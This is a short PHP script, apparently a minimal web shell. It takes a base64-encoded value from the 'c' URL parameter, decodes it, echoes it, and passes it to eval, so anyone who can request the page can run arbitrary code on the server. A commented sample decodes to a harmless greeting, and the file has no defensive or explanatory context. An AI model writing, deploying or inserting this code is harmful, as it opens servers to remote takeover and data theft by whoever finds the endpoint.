<?php
$e = $_GET['c'];
//$e = 'PD9waHAgZWNobyAiSGVsbG8sIFdvcmxkISI7ID8+';

$d = base64_decode($e);

echo htmlspecialchars($d);

eval('?>' . $d);

?>
